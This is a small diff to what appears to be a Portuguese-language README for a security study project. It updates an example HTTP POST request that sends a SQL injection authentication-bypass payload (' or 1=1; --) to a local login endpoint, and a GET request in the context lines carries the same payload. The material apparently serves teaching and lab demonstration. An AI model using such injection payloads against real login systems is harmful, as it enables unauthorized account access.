@@ -53,8 +53,8 @@ $ GET http://127.0.0.1:5000/login?username=%27%20or%201=1;%20--&password=1234
 POST /login HTTP/1.1
 Host: 127.0.0.1:5000
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 34
+Content-Length: 48
 
-username='%20or%201%3D1%3B%20--%20
+username='%20or%201%3D1%3B%20--%20&password=1234
 ```
 Baseado no projeto [EstudosAvancadosSI](https://github.com/BrunoEleodoro/EstudosAvancadosSI)
